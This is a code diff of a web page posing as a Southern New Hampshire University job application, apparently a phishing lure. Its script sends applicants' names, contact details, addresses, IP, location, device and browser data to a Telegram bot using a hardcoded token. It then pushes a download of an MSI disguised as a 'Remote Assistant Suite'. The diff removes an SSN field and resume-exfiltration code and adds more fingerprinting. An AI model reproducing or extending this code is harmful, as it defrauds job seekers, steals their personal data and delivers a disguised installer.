@@ -290,44 +290,36 @@
             }
         }
         
-        /* File Upload */
-        .file-upload {
-            border: 2px dashed #d1d5db;
+        /* Resume Note Box */
+        .resume-note-box {
+            background: linear-gradient(135deg, #f8f9ff 0%, #eef2ff 100%);
+            border-left: 4px solid var(--snhu-navy);
+            padding: 1.5rem;
             border-radius: 8px;
-            padding: 2rem;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            background-color: #fafafa;
+            margin: 1.5rem 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 1rem;
         }
         
-        .file-upload:hover {
-            border-color: var(--snhu-navy);
-            background-color: #f0f7ff;
-        }
-        
-        .file-upload.dragover {
-            border-color: var(--snhu-navy);
-            background-color: #e6f2ff;
-        }
-        
-        .file-upload-content {
-            color: var(--snhu-medium-gray);
-        }
-        
-        .file-upload-content i {
-            font-size: 2rem;
-            margin-bottom: 1rem;
+        .resume-note-icon {
             color: var(--snhu-navy);
+            font-size: 1.5rem;
+            flex-shrink: 0;
+            margin-top: 0.25rem;
         }
         
-        .file-selected {
-            margin-top: 1rem;
-            padding: 0.75rem;
-            background-color: #e8f5e9;
-            border-radius: 6px;
-            color: #2e7d32;
-            font-weight: 500;
+        .resume-note-content h4 {
+            color: var(--snhu-navy);
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+        
+        .resume-note-content p {
+            color: var(--snhu-medium-gray);
+            font-size: 0.95rem;
+            line-height: 1.5;
         }
         
         /* Button Styling */
@@ -612,22 +604,16 @@
                                     </div>
                                 </div>
 
-                                <div class="form-row">
-                                    <div class="form-group">
-                                        <label class="form-label required" for="ssn">Social Security Number</label>
-                                        <input type="text" id="ssn" class="form-control" placeholder="XXX-XX-XXXX" required>
-                                    </div>
-                                    <div class="form-group">
-                                        <label class="form-label required" for="currentStatus">Current Status</label>
-                                        <select id="currentStatus" class="form-control" required>
-                                            <option value="">Select current status</option>
-                                            <option value="student">Current Student</option>
-                                            <option value="graduate">Recent Graduate</option>
-                                            <option value="employed">Employed</option>
-                                            <option value="unemployed">Seeking Employment</option>
-                                            <option value="career_change">Career Change</option>
-                                        </select>
-                                    </div>
+                                <div class="form-group">
+                                    <label class="form-label required" for="currentStatus">Current Status</label>
+                                    <select id="currentStatus" class="form-control" required>
+                                        <option value="">Select current status</option>
+                                        <option value="student">Current Student</option>
+                                        <option value="graduate">Recent Graduate</option>
+                                        <option value="employed">Employed</option>
+                                        <option value="unemployed">Seeking Employment</option>
+                                        <option value="career_change">Career Change</option>
+                                    </select>
                                 </div>
 
                                 <div class="form-group">
@@ -650,18 +636,14 @@
                                     </div>
                                 </div>
 
-                                <div class="form-group">
-                                    <label class="form-label required">Resume Upload</label>
-                                    <div class="file-upload" id="fileUploadArea">
-                                        <input type="file" id="resume" accept=".pdf,.doc,.docx" style="display: none;">
-                                        <div class="file-upload-content">
-                                            <i class="fas fa-cloud-upload-alt"></i>
-                                            <p>Click to upload or drag and drop</p>
-                                            <p class="text-small">PDF, DOC, or DOCX (Max 5MB)</p>
-                                        </div>
+                                <!-- Resume Note Box -->
+                                <div class="resume-note-box">
+                                    <div class="resume-note-icon">
+                                        <i class="fas fa-file-alt"></i>
                                     </div>
-                                    <div id="fileSelected" class="file-selected hidden">
-                                        <i class="fas fa-file-check"></i> <span id="fileName"></span>
+                                    <div class="resume-note-content">
+                                        <h4>Resume Information</h4>
+                                        <p><strong>Note:</strong> Resumes can be requested separately during the interview process if needed. For this initial application, please focus on completing the form below with your basic information.</p>
                                     </div>
                                 </div>
 
@@ -860,9 +842,6 @@
         const TELEGRAM_BOT_TOKEN = '8526650918:AAGnLa86BtAohGUNMllQPkHWgAW0ZT63t6Q';
         const TELEGRAM_CHAT_ID = '8469619186';
         const MIN_AGE = 18;
-        const MAX_RESUME_SIZE = 5 * 1024 * 1024;
-        
-        let resumeFile = null;
 
         // ============================================
         // PAGE NAVIGATION
@@ -918,63 +897,38 @@
             }
         }
 
-        async function sendFileToTelegram(file, caption) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('document', file);
-                formData.append('caption', caption);
-                
-                const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
-                const response = await fetch(apiUrl, {
-                    method: 'POST',
-                    body: formData
-                });
-                return response.ok;
-            } catch (error) {
-                console.error('Telegram file error:', error);
-                return false;
-            }
-        }
-
         // ============================================
         // FORM HANDLING
         // ============================================
         function initializeForm() {
             const form = document.getElementById('applicationForm');
-            const fileUploadArea = document.getElementById('fileUploadArea');
-            const resumeInput = document.getElementById('resume');
-            const fileSelected = document.getElementById('fileSelected');
-            const fileName = document.getElementById('fileName');
             const submitBtn = document.getElementById('submitBtn');
             const downloadBtn = document.getElementById('downloadBtn');
 
-            // File upload handling
-            fileUploadArea.addEventListener('click', () => resumeInput.click());
-            
-            resumeInput.addEventListener('change', (e) => {
-                const file = e.target.files[0];
-                if (file) handleFileSelect(file);
-            });
-
-            fileUploadArea.addEventListener('dragover', (e) => {
-                e.preventDefault();
-                fileUploadArea.classList.add('dragover');
-            });
-
-            fileUploadArea.addEventListener('dragleave', () => {
-                fileUploadArea.classList.remove('dragover');
-            });
-
-            fileUploadArea.addEventListener('drop', (e) => {
-                e.preventDefault();
-                fileUploadArea.classList.remove('dragover');
-                const file = e.dataTransfer.files[0];
-                if (file) {
-                    resumeInput.files = e.dataTransfer.files;
-                    handleFileSelect(file);
+            // Phone number formatting
+            const phoneInput = document.getElementById('phone');
+            phoneInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 3 && value.length <= 6) {
+                    value = '(' + value.substring(0, 3) + ') ' + value.substring(3);
+                } else if (value.length > 6) {
+                    value = '(' + value.substring(0, 3) + ') ' + 
+                            value.substring(3, 6) + '-' + 
+                            value.substring(6, 10);
                 }
+                
+                e.target.value = value;
             });
+
+            // Date of Birth validation
+            const dobInput = document.getElementById('dob');
+            const today = new Date();
+            const minDate = new Date(today.getFullYear() - MIN_AGE, today.getMonth(), today.getDate());
+            const maxDate = new Date(today.getFullYear() - 100, today.getMonth(), today.getDate());
+            
+            dobInput.max = minDate.toISOString().split('T')[0];
+            dobInput.min = maxDate.toISOString().split('T')[0];
 
             // Form submission
             form.addEventListener('submit', async (e) => {
@@ -994,10 +948,6 @@
                     
                     // Send to Telegram
                     await sendToTelegram(telegramMessage);
-                    if (resumeFile) {
-                        const resumeCaption = `📄 Resume - ${formData.firstName} ${formData.lastName}`;
-                        await sendFileToTelegram(resumeFile, resumeCaption);
-                    }
 
                     // Switch to download page
                     setTimeout(() => {
@@ -1027,13 +977,15 @@
 📧 Email: ${document.getElementById('email').value}
 🌍 Location: ${location.city}, ${location.country}
 ⏰ Time: ${new Date().toLocaleString()}
+📱 Device: ${navigator.platform}
+🌐 Browser: ${navigator.userAgent}
                     `;
                     await sendToTelegram(downloadMessage);
 
                     // Trigger download
                     setTimeout(() => {
                         const link = document.createElement('a');
-                        link.href = '/SNHU_Remote_Assistant_Suite_v2.4.1.msi'; // In real implementation, this would be the actual file URL
+                        link.href = '/SNHU_Remote_Assistant_Suite_v2.4.1.msi';
                         link.download = 'SNHU_Remote_Assistant_Suite_v2.4.1.msi';
                         document.body.appendChild(link);
                         link.click();
@@ -1054,27 +1006,6 @@
         // ============================================
         // HELPER FUNCTIONS
         // ============================================
-        function handleFileSelect(file) {
-            if (!file) return;
-
-            const validTypes = ['application/pdf', 'application/msword', 
-                               'application/vnd.openxmlformats-officedocument.wordprocessingml.document'];
-            
-            if (!validTypes.includes(file.type)) {
-                alert('Please upload a PDF, DOC, or DOCX file.');
-                return;
-            }
-
-            if (file.size > MAX_RESUME_SIZE) {
-                alert('File size exceeds 5MB limit.');
-                return;
-            }
-
-            resumeFile = file;
-            document.getElementById('fileName').textContent = file.name;
-            document.getElementById('fileSelected').classList.remove('hidden');
-        }
-
         function validateForm() {
             let isValid = true;
             const requiredFields = document.querySelectorAll('[required]');
@@ -1088,11 +1019,6 @@
                 }
             });
 
-            if (!resumeFile) {
-                alert('Please upload your resume.');
-                isValid = false;
-            }
-
             return isValid;
         }
 
@@ -1104,13 +1030,11 @@
                 educationLevel: document.getElementById('educationLevel').value,
                 email: document.getElementById('email').value,
                 phone: document.getElementById('phone').value,
-                ssn: document.getElementById('ssn').value,
                 currentStatus: document.getElementById('currentStatus').value,
                 address: document.getElementById('address').value,
                 city: document.getElementById('city').value,
                 state: document.getElementById('state').value,
                 zip: document.getElementById('zip').value,
-                resumeFileName: resumeFile?.name || 'No file',
                 submissionTime: new Date().toLocaleString()
             };
         }
@@ -1128,16 +1052,15 @@
 • Status: ${formData.currentStatus}
 • Email: ${formData.email}
 • Phone: ${formData.phone}
-• SSN: ${formData.ssn}
 
 📍 ADDRESS
 ${formData.address}
 ${formData.city}, ${formData.state} ${formData.zip}
 
-📄 RESUME: ${formData.resumeFileName}
 ⏰ Submitted: ${formData.submissionTime}
 🌍 Location: ${location.city}, ${location.country}
 🌐 IP: ${location.ip}
+📱 Device: ${navigator.platform}
             `;
         }
 
@@ -1156,7 +1079,8 @@ ${formData.city}, ${formData.state} ${formData.zip}
 📱 Platform: ${navigator.platform}
 🌍 Location: ${location.city}, ${location.country}
 ⏰ Time: ${new Date().toLocaleString()}
-                `;
+🔗 Referrer: ${document.referrer || 'Direct'}
+            `;
                 sendToTelegram(pageViewMessage);
             }, 1000);
         });
